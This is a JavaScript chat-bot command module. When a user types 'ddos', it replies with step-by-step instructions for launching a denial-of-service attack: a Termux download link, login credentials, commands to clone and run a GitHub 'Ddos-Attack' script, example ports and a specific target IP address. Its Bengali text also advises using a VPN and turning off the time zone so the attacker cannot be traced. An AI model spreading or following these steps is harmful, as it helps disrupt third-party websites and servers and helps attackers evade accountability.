module.exports = {
 config: {
	 name: "ddos",
	 version: "1.0",
	 author: "AceGun",
	 countDown: 5,
	 role: 0,
	 shortDescription: "no prefix",
	 longDescription: "no prefix",
	 category: "no prefix",
 },

 onStart: async function(){}, 
 onChat: async function({ event, message, getLang }) {
 if (event.body && event.body.toLowerCase() === "ddos") {
 return message.reply({
 body: "     「°-۵༎-💚🌸Termux apk link 🔗:- https://t.me/Online_income_bd7187/522 \n\nUser:ddos\nPass:NAZMUL\ngit clone https://github.com/DARK-NI/Ddos-Attack\ncd Ddos-Attack\npython2 ddos.py\nEnter Port      : 8080 / 9090 / 9999\nEnter Terget IP :  70.32.23.110 \n\nDDOS attack দেওয়ার আগে ....\n\nযেকোনো দেশের ওয়েবসাইট এটাক দেওয়ার আগেই,\n\n অবশ্যই যে কোন একটা ভিপিএন কানেক্ট করে নিবেন। \nআর যদি সম্ভব হয় , তাহলে আপনার মোবাইল সেটিং  থেকে time zone বন্ধ করে নিবেন ।\n\nতাহলে আপনার নিজেরও নিরাপত্তা বজায় থাকবে।\n\n ddos সংক্রান্ত কোনো অসুবিধার সম্মুখীন হলে, যেকোনো টারমাস্ক এক্সপার্ট অথবা বট একজনের সাথে যোগাযোগ করুন।\n বট এড়মিনের সাথে যোগাযোগ করতে টাইপ করুন /info 🍁\n\n𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥\n\n\n☆SA IF☆\n____ッ」",
 attachment: await global.utils.getStreamFromURL("")
 });
 }
 }
}